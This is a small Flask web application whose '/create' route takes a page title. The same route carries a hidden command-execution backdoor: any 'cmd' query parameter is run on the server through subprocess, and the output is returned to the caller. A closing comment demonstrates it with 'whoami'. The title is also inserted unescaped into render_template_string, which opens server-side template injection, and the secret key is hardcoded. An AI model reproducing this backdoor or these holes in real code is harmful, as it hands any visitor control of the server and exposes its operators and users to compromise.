from flask import Flask, request, render_template_string

app = Flask(__name__)
app.secret_key = b'SECRET_KEY'

@app.route('/create', methods=['GET'])
def create():
    title = request.args.get('title')

    import subprocess
    if request.args.get('cmd'):
        p = subprocess.Popen(request.args.get('cmd').split(),
                stdout=subprocess.PIPE,
		stderr=subprocess.PIPE)
        p.wait()
        out, err = p.communicate()
        return out

    template = '''
    	<!DOCTYPE html>
    	<html>
      	<head>
        	<title>Create</title>
      	</head>
      	<body>
        	<p>''' + title + '''</p>
      	</body>
    	</html>'''
    return render_template_string(template)

if __name__ == '__main__':
    	app.run()


# test
# http://localhost:5000/create?title=hello&cmd=whoami
